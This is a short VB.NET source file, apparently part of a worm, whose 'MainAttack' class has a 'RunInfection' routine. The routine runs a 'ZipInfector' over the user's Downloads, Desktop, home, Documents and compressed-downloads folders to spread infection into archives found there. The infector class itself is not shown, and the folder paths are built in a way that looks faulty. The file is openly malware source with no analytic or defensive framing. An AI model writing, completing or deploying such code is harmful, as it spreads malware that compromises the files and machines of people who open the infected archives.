﻿Public Class MainAttack
    Public Sub RunInfection()
        Dim spread As New ZipInfector
        spread.Start("C:\" & Environ("Username") & "\Downloads")
        spread.Start("C:\" & Environ("Username") & "\Desktop")
        spread.Start("C:\" & Environ("Username") & "\")
        spread.Start("C:\" & Environ("Username") & "\Documents")
        If IO.File.Exists("C:\" & Environ("Username") & "\Downloads\Compressed\") Then
            spread.Start("C:\" & Environ("Username") & "\Downloads\Compressed\")
        End If
    End Sub
End Class
